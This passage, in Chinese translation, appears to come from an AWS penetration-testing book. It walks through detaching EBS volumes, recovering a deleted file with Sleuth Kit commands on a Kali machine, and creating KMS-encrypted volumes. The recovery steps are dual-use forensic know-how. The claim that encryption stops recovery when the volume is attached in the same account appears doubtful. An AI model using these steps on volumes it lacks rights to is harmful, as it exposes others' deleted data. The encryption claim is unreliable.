sudo umount -d /dev/xvdf
```

现在，让我们从 EC2 实例中分离卷：

1.  在`https://console.aws.amazon.com/ec2/`上打开 Amazon EC2 控制台。

1.  在导航窗格中，选择卷。

1.  选择一个卷并选择操作|分离卷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ea6f2588-7548-4262-918f-553efc565011.png)

1.  在确认对话框中，选择是。

因此，我们已成功从 EC2 实例中分离了卷。

# 从 EBS 卷中提取已删除的数据

在我们的下一个活动中，我们将学习如何将卷附加到我们的 Kali 机器，然后使用取证来恢复已删除的数据。在进行实际操作之前，让我们了解一下取证是什么，以及数据恢复是如何工作的。

数字取证数据分析（FDA）属于数字取证范畴，是恢复和分析数据以了解数据创建方式，并在网络犯罪和欺诈案件中获取数字证据的方法。数据恢复可以在包括移动设备、存储设备和服务器在内的一系列设备上进行。涉及的技术包括数据解密和日志的二进制反向工程分析。

在数据恢复方面，我们面临两种类型的数据；即持久数据（写入驱动器并且易于访问）和易失性数据（临时数据，很有可能丢失）。那么，我们如何从驱动器中恢复数据？为了理解这一点，我们首先需要了解文件系统是什么，以及数据是如何存储在驱动器中的。

文件系统是操作系统用于组织数据的数据结构和算法的组合。每个操作系统都有不同类型的文件系统来组织和跟踪数据。让我们来看看最受欢迎的操作系统使用的典型文件系统：

+   Windows：通常使用新技术文件系统（NTFS）；其他支持的文件系统包括文件分配表（FAT）/FAT32 和弹性文件系统（ReFS）

+   Linux：支持多种类型的文件系统，如扩展文件系统（XFS）、Ext2/3/4、ReiserFS 和日志文件系统（JFS）/JFS2

+   macOS：早期的苹果设备使用分层文件系统加（HFS+）文件系统；自 macOS High Sierra 起，改为 Apple 文件系统（APFS）。

+   BSD/Solaris/Unix：Unix 文件系统（UFS）/UFS2

在此演示中，我们正在使用通常使用**扩展**（**ext**）文件系统的 Linux 操作系统。那么，在 Linux 文件系统中如何存储和检索数据呢？文件在文件系统中被视为一系列字节。所有文件都使用一种称为**索引节点**（**inodes**）的数据结构进行存储。每个文件被分配一个唯一的`inode`编号。每个目录都有一个将文件名映射到其`inode`编号的表。Inodes 包含指向文件的磁盘块的指针。当我们在目录中访问文件时，操作系统会查找目录表并获取给定文件名的`inode`。Inodes 还包含其他属性，如所有者和权限。

您可以使用`ls -l -i`命令在目录中看到文件的`inode`编号。

在删除数据时，Ext4 文件系统会清理文件节点，然后使用新释放的空间更新数据结构。这意味着只有文件的元数据被删除，文件本身仍然存在于磁盘上。这是至关重要的，因为我们将使用 inode 来计算和找出已删除文件的位置。

了解了这一点，让我们看看如何通过计算 inode 来恢复数据。

与之前所做的类似，转到 EC2 | 卷，并选择我们从 Ubuntu 机器上卸载的卷：

1.  选择附加，然后将其附加到您的 Kali 机器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8172033c-89ef-43aa-ab1f-9c1017fbabfa.png)

1.  一旦卷被附加，使用`lsblk`标识分区；镜像将是`/dev/xvdf`：

```
sudo lsblk
```

使用 TSK（取证框架），让我们尝试恢复`data.txt`文件。

1.  检查镜像上的文件系统：

```
sudo mmls /dev/xvdf
```

1.  使用 Linux 分区的起始扇区地址列出文件：

```
sudo fls -o <OFFSET> /dev/xvdf
```

您可以从`0`偏移开始，然后相应地计算后续的`inode`编号。

1.  获取文件的`inode`编号：

```
sudo fls -o <OFFSET> /dev/xvdf <inode of data.txt>
```

1.  使用`icat`来恢复我们删除的文件：

```
sudo icat -o <OFFSET> -r /dev/xvdf <inode-file-to-recover> > /tmp/data
```

如果打印`/tmp/data`的内容，您将发现我们之前写入的``"Hello World"``。

# EBS 卷上的全盘加密

通过 Amazon 的 KMS 实现数据加密，通过强制执行强加密标准以及管理和保护密钥本身来实现。数据使用 AES 256 位加密算法进行加密，这被认为是最佳的数据加密标准之一。亚马逊还确保这些标准绝对符合**1996 年健康保险可移植性和责任法案**（**HIPAA**）、**支付卡行业**（**PCI**）和**国家标准与技术研究所**（**NIST**）。

以下进行加密：

+   卷内的静态数据

+   从卷创建的所有快照

+   所有磁盘 I/O

那么，数据是如何加密的呢？AWS 使用 CMK 来加密 EBS 卷。CMK 默认包含在 AWS 的每个区域中。数据可以使用包含的 CMK 加密，或者用户可以使用 AWS KMS 创建新的 CMK。AWS 使用 CMK 为每个存储卷分配数据密钥。当卷附加到 EC2 实例时，数据密钥用于加密所有静态数据。数据密钥的副本也被加密并存储在卷中。EC2 实例上的数据加密是无缝的，并且在加密或解密数据时几乎没有延迟。

所有类型的 EBS 卷都支持全盘加密。但是，并非所有 EC2 实例都支持加密卷。

只有以下 EC2 实例支持 EBS 加密：

+   **通用型**：A1、M3、M4、M5、M5d、T2 和 T3

+   **计算优化**：C3、C4、C5、C5d 和 C5n

+   **内存优化**：cr1.8xlarge、R3、R4、R5、R5d、X1、X1e 和 z1d

+   **存储优化**：D2、h1.2xlarge、h1.4xlarge、I2 和 I3

+   **加速计算**：F1、G2、G3、P2 和 P3

+   **裸金属**：i3.metal、m5.metal、m5d.metal、r5.metal、r5d.metal、u-6tb1.metal、u-9tb1.metal、u-12tb1.metal 和 z1d.metal

任何加密存储卷的快照默认都是加密的，从这些快照创建的任何卷也默认是加密的。您可以同时将加密和未加密的存储卷附加到 EC2 实例。

# 创建加密卷

让我们看看如何加密 EBS 卷：

1.  转到 AWS EC2 页面，确保 Ubuntu 服务器正在运行。

1.  现在是创建新的 EBS 存储卷的时候了。在左侧找到弹性块存储，然后单击卷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/82e048f7-0b57-45aa-b8de-a630abf7a9c3.png)

1.  单击创建卷，输入以下详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/69ffa745-9439-4c30-b702-21687b2e49e9.png)

1.  勾选标记为加密的框。您可以选择内置的主密钥 aws/ebs，或者您可以从 KMS 服务创建自己的主密钥：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d0245932-aa21-4f06-a79c-89599649968d.png)

1.  选择主密钥并创建卷。一旦卷成功创建，您可以单击关闭按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d2963804-f4a7-478c-b571-6de910895d4a.png)

# 附加和挂载加密卷

一旦卷创建完成，我们将把卷附加到我们的 Ubuntu EC2 实例：

1.  转到 EBS | Volumes，并勾选我们刚刚创建的卷的框。

1.  单击操作，选择附加卷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/c7eb21cd-f9ff-49db-b5c2-08265730bb9d.png)

1.  在弹出部分，选择要附加的 Ubuntu EC2 实例，并选择附加：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/5d07ff67-1158-4fed-8ad6-9f3f4f884724.png)

1.  SSH 进入 Ubuntu 实例并检查我们附加的卷；然后发出以下命令：

```
lsblk
```

与以前一样，这将列出我们附加到实例的磁盘。在这种情况下，我们可以再次看到一个名为`/dev/xvdf`的设备。

1.  让我们再次将卷格式化为`ext4`：

```
sudo mkfs -t ext4 /dev/xvdf
```

1.  然后将卷挂载到文件夹：

```
sudo mount /dev/xvdf /newvolume/
```

1.  让我们创建另一个数据文件；稍后我们将删除此文件并尝试再次恢复它：

```
sudo touch data.txt
sudo chmod 666 data.txt
echo "Hello World" > data.txt
```

1.  现在让我们删除文件：

```
sudo rm -rf data.txt
```

1.  然后按以下步骤卸载驱动器：

```
sudo umount -d /dev/xvdf
```

1.  最后，在 AWS 的 EC2 仪表板上，转到 EBS | Volumes。

1.  选择加密驱动器，单击操作，然后单击分离卷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/77517138-422b-499e-963d-04c960024456.png)

1.  最后，在弹出窗口中，选择是，分离：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/913ed412-fdd1-44b8-a25c-d3cb2a7191a4.png)

我们有一个加密的 EBS 卷，其中写入了数据，然后删除了。接下来，我们将看看是否可以再次检索数据。

# 从加密卷中检索数据

现在让我们看看是否可以从加密卷中检索数据：

1.  转到 EBS | Volumes 并选择加密卷。

1.  单击附加卷；这次，在弹出的警报中，将卷附加到我们的 Kali 机器上：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/cbeacf93-d502-41e4-b3db-66cdc5dca1b7.png)

1.  一旦卷被附加，SSH 进入 Kali 机器。发出以下命令以识别卷：

```
lsblk
```

使用 TSK（取证框架），让我们尝试恢复`data.txt`文件。

1.  检查图像上的文件系统：

```
sudo mmls /dev/xvdf
```

1.  使用 Linux 分区的起始扇区地址列出文件：

```
sudo fls -o <OFFSET> /dev/xvdf
```

您可以从`0`偏移开始，然后相应地计算后续的`inode`编号。

1.  获取文件的`inode`编号：

```
sudo fls -o <OFFSET> /dev/xvdf <inode of data.txt>
```

由于驱动器是完全加密的，因此在发出此命令时，您将不会得到任何返回值。因此，由于您没有`inode`编号，您无法从驱动器中检索任何数据。

因此，似乎我们可以通过完全磁盘加密防止删除的数据被恢复。

# 总结

在本章中，我们了解了 EC2 实例可用的不同类型的存储以及它们的使用方式。我们还了解了数据加密和亚马逊的 KMS。我们通过 EBS 块存储的使用步骤，为 EC2 实例创建额外的存储并将其挂载到 EC2 实例中。此外，我们还学习了如何使用 TSK 通过内存分析从 EBS 存储卷中恢复丢失的数据。

为了保护我们的数据，我们学习了如何使用 AWS KMS 对 EBS 卷进行加密，以加密静态数据。我们还看到了如何使用全盘加密来防止某人检索敏感数据。

这就是本章的结束。在下一章中，我们将学习关于 S3 存储以及如何识别易受攻击的 S3 存储桶。我们还将看到 S3 存储桶踢的操作以及如何利用易受攻击的 S3 存储桶。

# 进一步阅读

+   **The Sleuth Kit**: [`www.sleuthkit.org/sleuthkit/docs.php`](https://www.sleuthkit.org/sleuthkit/docs.php)

+   **存储**: [`docs.aws.amazon.com/AWSEC2/latest/UserGuide/Storage.html`](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/Storage.html)

+   **Amazon EBS 加密**: [`docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html`](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/EBSEncryption.html)
